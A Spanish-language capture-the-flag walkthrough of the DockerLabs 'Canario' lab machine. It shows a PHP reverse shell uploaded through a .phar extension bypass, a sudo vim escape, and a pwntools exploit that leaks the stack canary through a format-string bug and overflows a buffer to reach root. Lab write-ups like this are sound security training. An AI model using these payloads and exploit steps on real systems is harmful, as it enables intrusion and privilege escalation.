---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Canario DockerLabs (Hard)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip canario.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh canario.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 09:43 EST
Nmap scan report for 172.17.0.2
Host is up (0.000030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```

Vemos que solo tenemos un puerto que es una pagina web en la que pone `Sube tu archivo`, si le damos al boton `Subir archivo` veremos que podremos subir un archivo, por lo que intentaremos generarnos una `reverse shell` con un archivo `PHP`:

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Si subimos el archivo con la extension `.php` nos lo bloqueara, pero si probamos a `Bypassear` la extension con un `.phar` y veremos que si nos deja.

```shell
mv shell.php shell.phar
```

Y ahora si lo subimos, nos pondra lo siguiente:

```
Archivo subido correctamente.
```

Vamos a realizar un poco de `fuzzing` para ver donde puede estar nuestro archivo.

## Escalate user www-data

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 456]
/javascript           (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/upload.php           (Status: 200) [Size: 0]
/upload               (Status: 200) [Size: 635]
/uploads              (Status: 200) [Size: 942]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que tendremos `2` carpetas llamadas `/uploads` y `/upload`, probemos a entrar a la primera carpeta y veremos que esta nuestro archivo, por lo que antes de ejecutarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si ejecutaremos el archivo desde la web y si vamos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.60.128] from (UNKNOWN) [172.17.0.2] 53930
whoami
www-data
```

Veremos que somos el usuario `www-data`, por lo que santizaremos la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user jerry

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on b75fcc146213:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on b75fcc146213:
    (jerry) NOPASSWD: /usr/bin/vim
```

Veremos que podemos ejecutar el binario `vim` como el usuario `jerry`, por lo que haremos lo siguiente:

```shell
sudo -u jerry vim -c ':!/bin/bash'
```

Info:

```
jerry@b75fcc146213:/var/www/html/uploads$ whoami
jerry
```

Y con esto veremos que seremos el usuario `jerry`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for jerry on b75fcc146213:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jerry may run the following commands on b75fcc146213:
    (ALL) NOPASSWD: /opt/suma
    (ALL) NOPASSWD: /usr/bin/python3 /opt/command_exec/command_exec.py
```

Vemos que podemos ejecutar el script `suma` y con la herramienta `python3` el script `command_exec.py` como el usuario `root`, por lo que haremos lo siguiente:

Si leemos el siguiente archivo `flag.txt` que se encuentra en la carpeta `command_exec` veremos lo siguiente:

```shell
cat /opt/command_exec/flag.txt
```

Info:

```
INACTIVE
```

Es interesante que ponga esa palabra, pero vamsos a seguir investigando, si ejecutamos lo siguiente:

```shell
sudo python3 /opt/command_exec/command_exec.py
```

Info:

```
Denegado
```

No podremos hacer gran cosa, vamos a ver que hace el script por dentro:

```python
#!/usr/bin/python3

import os, sys

def main():

    with open("/opt/command_exec/flag.txt", "r") as flag_file:

        content = flag_file.readlines()[0]

        if content == "ACTIVE":

            print("Autorizado\n")

            cmd = input("Escribe un comando: ")

            os.system(cmd)

        else:

            print("Denegado")
            sys.exit(1)


if __name__ == '__main__':

    main()
```

Por lo que vemos si conseguimos que el `.txt` consiga poner `ACTIVE` podremos ejecutar el script y podremos ejecutar un comando, por lo que vamos a ejecutar el script de `suma` a ver que hace.

```shell
sudo /opt/suma
```

Info:

```
Escribe su nombre:
root
Hola, root

Escribe la clave para acceder a la funcionalidad del software:
test
Acceso denegado
```

Vamos a probar si pudieramos desbordar el `buffer` de este binario.

```shell
sudo /opt/suma
```

Info:

```
Escribe su nombre:
root
Hola, root

Escribe la clave para acceder a la funcionalidad del software:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: terminated
Aborted
```

Vemos alguna funcion rara, por lo que vamos a investigarlo de mejor forma en nuestro `host`, nos vamos abrir un servidor de `python3` para pasarnos el archivo `suma` al `host`.

```shell
python3 -m http.server
```

Y ahora en nuestro `host` nos lo descargaremos de la siguiente manera:

```shell
wget http://<IP>:8000/suma
```

Vamos a ver un poco el codigo a pelo con la herramienta `strings`.

```shell
strings suma
```

Info:

```
...........................................
PTE1
Hola
Flag activada
/opt/command_exec/flag.txt
ACTIVE
Escribe su nombre:
Escribe la clave para acceder a la funcionalidad del software:
x8-_7vjw-0#0l-9.AA$_$p3bA!
Acceso garantizado
 podr
s calcular sumas en tiempo real
Escribe el primer n
mero: 
Escribe el segundo n
mero: 
Resultado: %d
Acceso denegado
;*3$"
GCC: (Debian 13.3.0-1) 13.3.0
crt1.o
...........................................
```

Vemos varias cosas interesantes, entre ellas una palabra que parece ser la contraseña del `software`:

```
x8-_7vjw-0#0l-9.AA$_$p3bA!
```

Si lo probamos en la maquina victima:

```shell
sudo /opt/suma
```

Info:

```
Escribe su nombre:
root
Hola, root

Escribe la clave para acceder a la funcionalidad del software:
x8-_7vjw-0#0l-9.AA$_$p3bA!

Acceso garantizado
Aquí podrás calcular sumas en tiempo real

Escribe el primer número: 1
Escribe el segundo número: 2
Resultado: 3
```

Vemos que hace una suma de los numeros que metamos, pero no es interesante, vamos analizar las funciones que llama y que tiene, abriremos `ghidra`, importaremos el binario y lo analizaremos, vemos que tiene un `main` y un `set_flag` que parece bastante interesante:

> main.c

```c
undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  int local_168;
  int local_164;
  undefined4 local_15f;
  undefined4 uStack_15b;
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  setgid(0);
  local_15f = 0x616c6f48;
  uStack_15b = CONCAT13(uStack_15b._3_1_,0x202c);
  sVar2 = strcspn((char *)&local_15f,"\n");
  *(undefined *)((long)&local_15f + sVar2) = 0;
  memset(local_118,0,0x100);
  memset((void *)((long)&uStack_15b + 3),0,0x40);
  puts("Escribe su nombre:");
  fgets((char *)((long)&uStack_15b + 3),0x40,stdin);
  printf("%s",&local_15f);
  printf((char *)((long)&uStack_15b + 3));
  puts("\nEscribe la clave para acceder a la funcionalidad del software:");
  gets(local_118);
  iVar1 = strcmp(local_118,"x8-_7vjw-0#0l-9.AA$_$p3bA!");
  if (iVar1 == 0) {
    printf("\nAcceso garantizado");
    puts(&DAT_004020c8);
    printf(&DAT_004020f6);
    __isoc99_scanf(&DAT_00402112,&local_168);
    printf(&DAT_00402115);
    __isoc99_scanf(&DAT_00402112,&local_164);
    printf("Resultado: %d",(ulong)(uint)(local_164 + local_168));
  }
  else {
    printf("Acceso denegado");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

> set\_flag.c

```c
void set_flag(void)

{
  FILE *__s;
  
  puts("Flag activada");
  __s = fopen("/opt/command_exec/flag.txt","w");
  fwrite("ACTIVE",1,6,__s);
  fclose(__s);
  return;
}
```

Vemos que la funcion `set_flag` esta cambiando la `flag.txt` y poniendo `ACTIVE` justo lo que buscamos, pero en ningun momento el programa llama a dicha funcion, por lo que tendremos que encontrar alguna vulnerabilidad como un `Buffer Overflow` para poder llamar a dicha funcion, si investigamos un poco en el codigo vemos que puede haber una vulnerabilidad llamada `Format String Vulnerability` en la siguiente linea:

```c
printf("%s",&local_15f);
```

El problema principal en el código es que se usa `printf()` de manera incorrecta.

**🔍 Qué está pasando en el código**

```c
printf("%s", &local_15f); printf((char *)((long)&uStack_15b + 3));
```

* **La primera línea está bien:** `printf("%s", &local_15f);` usa un formato seguro (`"%s"`) y una variable que contiene un string.
* **La segunda línea es el problema:** `printf((char *)((long)&uStack_15b + 3));` usa la entrada del usuario directamente sin especificar un formato seguro.

Cuando ingresamos nuestro nombre en el programa, se usa nuestra entrada como **formato de `printf`**, lo que significa que si escribimos `%p`, `%x`, `%s`, etc., `printf` intentará interpretarlo como un **código especial** en lugar de solo mostrar el texto.

***

### **🛠️ ¿Cómo podemos aprovechar esto?**

Dado que `printf()` está usando nuestra entrada directamente, podemos hacer cosas interesantes, como:

1. **Filtrar información de la memoria (leak de direcciones)**
   * Si ingresamos `%p`, `%x`, `%08x`, etc., veremos direcciones de memoria o datos internos del programa.
2. **Modificar valores en memoria (usando `%n`)**
   * `%n` le dice a `printf` que escriba el número de caracteres impresos en una dirección de memoria. Esto puede permitirnos **sobrescribir valores importantes**, como direcciones de retorno.

Vamos a ver que informacion nos muestra si ponemos varios `%p` de la siguiente forma:

```shell
sudo /opt/suma
```

Info:

```
Escribe su nombre:
%p%p%p%p%p
Hola, 0x402051(nil)(nil)0x4056bb0x73

Escribe la clave para acceder a la funcionalidad del software:
^C
```

Vemos que nos esta mostrando varias direcciones de memoria.

**Explorando el stack:**

En un **stack**, los datos se almacenan de forma ordenada. Primero se guardan algunas variables locales, luego la dirección de retorno de las funciones (que es a dónde el programa vuelve después de ejecutar una función), y otros datos. Cada vez que llamamos a `printf` con un `%p`, le estamos diciendo a `printf` que imprima una dirección que está en el stack.

Entonces, al enviar varios `%p` como entrada, podemos leer las direcciones de memoria del stack, una por una. Esto es como leer las páginas de un libro para entender cómo está estructurado el programa.

**Fuzzing con Bash:**

Para hacer todo esto de forma automatizada, creamos un pequeño **script en Python** que envía muchas veces el formato `%p` al programa y lee las direcciones de memoria una a una.

Este script puede ser como un explorador, leyendo diferentes partes de la memoria:

> detect.sh

```bash
#!/bin/bash

# Definimos el número de intentos para fuzzing
NUM_ITERATIONS=100

# Ruta del binario vulnerable
BINARY="/opt/suma"

# Realizamos fuzzing para leer valores del stack
for i in $(seq 1 $NUM_ITERATIONS); do
    # Enviamos el formato %p al programa y leemos la dirección de memoria
    result=$(echo "%${i}\$p" | $BINARY 2>/dev/null)

    # Extraemos solo la dirección de memoria que sigue después de "Hola,"
    address=$(echo "$result" | grep -oP "Hola, \K0x[0-9a-fA-F]+")

    # Si encontramos una dirección válida, la mostramos
    if [ -n "$address" ]; then
        echo "Iteración $i: $address"
    fi
done
```

**¿Qué hace el script?**

1. Abre el programa vulnerable y le envía varios `%p` (uno por vez).
2. `printf` devuelve la dirección de memoria de cada `%p`, y nosotros podemos leer esas direcciones.
3. Imprime esas direcciones, que pueden ser valores como `0x7f...` o `0x402051`, que nos dicen en qué parte de la memoria se encuentran ciertos datos.

```shell
cd /tmp
bash detect.sh
```

Info:

```
Iteración 1: 0x402051
Iteración 4: 0x4062b5
Iteración 5: 0x73
Iteración 7: 0x202c616c6f4800
Iteración 8: 0xa70243825
Iteración 49: 0xe25a2c6503c0ff00
Iteración 50: 0x1
Iteración 51: 0x7ffff7e0424a
Iteración 53: 0x401259
Iteración 54: 0x100000000
Iteración 55: 0x7fffffffec58
Iteración 56: 0x7fffffffec58
Iteración 57: 0x258c9c0c9d387e80
Iteración 59: 0x7fffffffec68
Iteración 60: 0x403e00
Iteración 61: 0x7ffff7ffd020
Iteración 62: 0x1b87166fd7c8e891
Iteración 63: 0x3d826b1d2b322e5c
Iteración 67: 0x7fffffffec58
Iteración 68: 0x7fffffffec58
Iteración 69: 0x9fabb2e7cb5d0400
Iteración 70: 0xd
Iteración 71: 0x7ffff7e04305
Iteración 72: 0x401259
Iteración 73: 0x403e00
Iteración 77: 0x401110
Iteración 78: 0x7fffffffec50
Iteración 81: 0x401131
Iteración 82: 0x7fffffffec48
Iteración 83: 0x38
Iteración 84: 0x1
Iteración 85: 0x7fffffffee91
Iteración 87: 0x7fffffffee9b
Iteración 88: 0x7fffffffeeab
Iteración 89: 0x7fffffffeeb7
Iteración 90: 0x7fffffffeee0
Iteración 91: 0x7fffffffeef3
Iteración 92: 0x7fffffffeefc
Iteración 93: 0x7fffffffef0a
Iteración 94: 0x7fffffffef1b
Iteración 95: 0x7fffffffef22
Iteración 96: 0x7fffffffef42
Iteración 97: 0x7fffffffef55
Iteración 98: 0x7fffffffef60
Iteración 99: 0x7fffffffef6b
Iteración 100: 0x7fffffffef73
```

**Buscando el canario:**

Ahora, cuando leemos estas direcciones de memoria, debemos buscar algo llamado **canario**. Los canarios son valores especiales que se colocan en el `stack` para evitar que un ataque de _buffer overflow_ sobrescriba cosas importantes, como la dirección de retorno de una función.

1. **¿Cómo identificamos el canario?** Los canarios tienen dos características muy específicas:
   * Son valores aleatorios (no son direcciones comunes).
   * Siempre terminan en `00`, lo que los hace fáciles de identificar.
2. **¿Cómo los buscamos?** Usamos el comando `grep` para filtrar las direcciones que terminan en `00`. Esto nos ayuda a encontrar el canario entre las direcciones que estamos leyendo.

```shell
bash detect.sh | grep -oE ".*?[0-9a-f]{14}00"
```

Info:

```
Iteración 49: 0x944828202aa6b000
Iteración 69: 0x2f5bced1b5fd4000
```

Esto filtra las direcciones que tienen la forma de un canario, y una vez que lo encontramos, sabemos que está cerca de la dirección de retorno en el `stack`.

Si vamos al programa en `C#` que obtuvimos anteriormente, podremos ver la longitud de `buffer` que tiene el programa en la siguiente linea:

```c
char local_118 [264];
```

Por lo que vemos es una cantidad fija, ya que esta con `char`, por lo que sabemos que el `offset` del programa esta despues del numero `264`, por lo que vamos a montarnos un script en `python3` para poder aprovechar todo esto.

**¿Cómo explotamos la vulnerabilidad?**

Para llevar a cabo un **buffer overflow**, necesitamos rellenar el buffer con suficientes bytes hasta que sobrescribamos el **canario** y la **dirección de retorno (RIP)**.

* **264 bytes** llenan el buffer.
* **8 bytes** sobrescriben el canario.
* **8 bytes adicionales** sobrescriben la dirección de retorno (RIP).

En total, necesitamos escribir **280 bytes** para sobrescribir el canario y la dirección de retorno.

**Lo que necesitamos para el ataque**

Lo que queremos hacer es:

1. **Sobrescribir el canario** con el valor correcto para que el programa no detecte que ha sido modificado.
2. **Sobrescribir la dirección de retorno (RIP)** para que, en lugar de regresar a la función anterior, se ejecute la función `set_flag`.

Para hacerlo, necesitamos conocer el valor del canario, el cual hemos descubierto anteriormente que nos salen `2` por lo que tendremos que coger uno de los `2`, por ejemplo elegiremos el que esta en la posicion `%69$p`.

**Construcción del payload**

Una vez que tenemos el canario, podemos construir el **payload** que enviamos al programa. El `payload` se construye con una secuencia específica de bytes:

1. **264 bytes** de relleno (`'A' * 264`) para llenar el buffer.
2. **El valor del canario** (que hemos obtenido previamente). Este es el valor correcto que debe ir en el lugar del canario para evitar que el programa lo detecte.
3. **8 bytes de relleno** (`'A' * 8`) hasta llegar a la dirección de retorno.
4. **La dirección de la función `set_flag`**. Esta es la función que queremos ejecutar al sobrescribir la dirección de retorno.

**Ejecución del payload**

El siguiente paso es enviar el **payload** al programa vulnerable. Cuando el programa recibe los **264 bytes de relleno**, sobrescribe el buffer sin que se active la protección del canario. Al añadir el valor del canario y sobrescribir la dirección de retorno con la dirección de `set_flag`, logramos redirigir la ejecución del programa a esa función.

**El exploit en Python con Pwntools**

Usamos la librería **Pwntools** para facilitar la creación del payload y la interacción con el programa. Aquí está el código que construimos:

> exploit.py

```python
#!/usr/bin/python3

from pwn import *

# Función principal para el proceso
def exploit():

    # Ruta del binario vulnerable
    binary_file = "./suma"  # Cambia esta ruta si es necesario

    # Usamos ELF para acceder a las funciones del binario
    elf = ELF(binary_file)  
    context.binary = elf

    # Establecemos los offsets de memoria que ya conocemos
    buffer_offset = 264
    return_offset = 8

    # Iniciamos el proceso de forma diferente usando `sudo`
    process_instance = process(["sudo", binary_file])  # Ejecutar con privilegios de sudo

    # Ahora leemos el canario directamente con un formato distinto
    process_instance.sendline(b'%69$p')  # Esto también lee el canario desde el stack
    process_instance.recvuntil(b'Hola, ')  # El programa imprime "Hola, ", lo capturamos
    canary = int(process_instance.recvline().strip(), 16)  # Convertimos la dirección de memoria del canario a int

    # Vamos a construir el payload usando `b'A'` para rellenar hasta los offsets
    payload = b'A' * buffer_offset  # Rellenamos con A hasta el canario
    payload += p64(canary)  # Agregamos el canario encontrado
    payload += b'A' * return_offset  # Rellenamos hasta la dirección de retorno
    payload += p64(elf.symbols['set_flag'])  # Redirigimos la ejecución a la función set_flag

    # Enviamos el payload al binario vulnerable
    process_instance.sendlineafter(b':', payload)

    # Ahora leemos la bandera (flag)
    flag = process_instance.recvall()

    print(flag)  # Mostramos la salida, que debe ser la bandera

    # Cerramos el proceso después de recibir la respuesta
    process_instance.close()

# Punto de entrada
if __name__ == '__main__':
    exploit()
```

**Explicación del código**

* **Definir el binario**:\
  El binario vulnerable es **`./suma`**. Usamos **`ELF()`** de `pwn` para acceder a este binario y manipularlo (por ejemplo, obtener direcciones de funciones como `set_flag`).
* **Obtener el canario**:\
  Usamos un formato **`%69$p`** para leer la dirección de memoria de la pila. Esto nos permite obtener el **canario**, que es un valor colocado para proteger la pila. Extraemos esta dirección del stack y la guardamos.
* **Construir el payload**:
  * **Rellenamos hasta el canario**: Usamos **`'A' * 264`** (tamaño del buffer) para llenar la memoria hasta el canario.
  * **Sobrescribimos el canario**: Insertamos el canario extraído en el lugar correspondiente.
  * **Sobrescribimos la dirección de retorno (RIP)**: Después de sobrescribir el canario, rellenamos hasta la dirección de retorno.
  * **Redirigir la ejecución**: Usamos la dirección de la función **`set_flag`** (obtenida desde el binario) para redirigir la ejecución del programa a esa función y obtener la flag.
* **Ejecutar el exploit**:\
  Enviamos el **payload** al binario vulnerable y, al ejecutar la función `set_flag`, logramos obtener la finalidad del ataque.

Ahora si nosotros ejecutamos esto en nuestro `host` veremos que funciona y llama a la funcion:

```shell
python3 exploit.py
```

Info:

```
[*] '/home/kali/Desktop/canario/suma'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process './suma': pid 106091
[+] Receiving all data: Done (30B)
[*] Stopped process './suma' (pid 106091)
b'\nAcceso denegadoFlag activada\n'
```

Vemos que nos pone `Flag activada` por lo que lo hemos echo de forma correcta, ahora vamos a copiar el codigo del script y pasarnoslo a la carpeta de `/tmp` de la maquina victima y lo vamos a ejecutar de nuevo, tendremos que cambiar la ruta del binario por `/opt/suma`:

Como necesitamos el modulo de `pwn` y vemos que tenemos `pip3` instalado, podremos instalarlo de la siguiente forma:

```shell
pip3 install pwntools --break-system-packages
```

Y ahora si ejecutaremos el script.

```shell
python3 exploit.py
```

Info:

```
[*] '/opt/suma'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/usr/bin/sudo': pid 6203
[+] Receiving all data: Done (30B)
[*] Process '/usr/bin/sudo' stopped with exit code -11 (SIGSEGV) (pid 6203)
b'\nAcceso denegadoFlag activada\n'
```

Vemos que nos ha funcionado, ahora si leemos la `flag.txt`:

```shell
cat /opt/command_exec/flag.txt
```

Info:

```
ACTIVE
```

Vemos que efectivamente a funcionado, por lo que habremos lo siguiente:

```shell
sudo python3 /opt/command_exec/command_exec.py
```

Info:

```
Autorizado

Escribe un comando: bash
root@b75fcc146213:/tmp# whoami
root
```

Ponemos `bash` cuando nos ponga el ejecutar un comando y ya seremos `root`, por lo que habremos terminado la maquina.
